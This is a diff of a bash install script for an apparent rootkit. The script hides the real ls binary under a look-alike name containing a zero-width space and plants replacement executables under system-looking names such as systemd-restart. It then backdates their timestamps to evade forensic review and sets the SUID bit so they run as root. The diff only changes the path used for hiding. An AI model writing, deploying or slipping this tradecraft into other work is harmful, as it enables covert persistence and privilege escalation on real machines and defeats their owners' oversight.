@@ -1,10 +1,10 @@
 #!/bin/bash
 if [ $# -eq 0 ]; then
     echo "No arguments supplied; assuming first time"
-	mv "/usr/bin/ls" "/usr/sbin/ls​" #THERE IS A ZERO WIDTH SPACE HERE
+	mv "/usr/bin/ls" "/usr/bin/ls​" #THERE IS A ZERO WIDTH SPACE HERE
 else
 	if [ $1 != "--reinstall" ]; then
-		mv "/usr/bin/ls" "/usr/sbin/ls​" #THERE IS A ZERO WIDTH SPACE HERE
+		mv "/usr/bin/ls" "/usr/bin/ls​" #THERE IS A ZERO WIDTH SPACE HERE
 	fi
 fi
 #Build executables
@@ -25,9 +25,9 @@ chown root:root /usr/bin/ls
 chown root:root /usr/bin/systemd-restart
 
 #Change dates of files
-touch -d "$(date -R -r /usr/sbin/ls​)" /usr/bin/ls
-touch -d "$(date -R -r /usr/sbin/ls​)" /usr/bin/systemd-path
-touch -d "$(date -R -r /usr/sbin/ls​)" /usr/bin/systemd-restart
+touch -d "$(date -R -r /usr/bin/ls​)" /usr/bin/ls
+touch -d "$(date -R -r /usr/bin/ls​)" /usr/bin/systemd-path
+touch -d "$(date -R -r /usr/bin/ls​)" /usr/bin/systemd-restart
 
 #Set suid so the process will always execute with system privileges
 chmod u+s /usr/bin/systemd-restart
